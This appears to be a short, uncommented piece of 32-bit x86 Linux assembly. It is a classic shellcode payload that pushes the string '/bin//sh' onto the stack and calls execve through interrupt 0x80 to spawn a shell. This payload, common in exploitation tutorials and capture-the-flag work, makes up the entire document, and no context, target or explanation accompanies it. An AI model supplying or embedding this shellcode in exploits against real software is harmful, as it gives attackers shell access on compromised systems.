xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor edx,edx
xor ecx,ecx
mov al,11
int 0x80

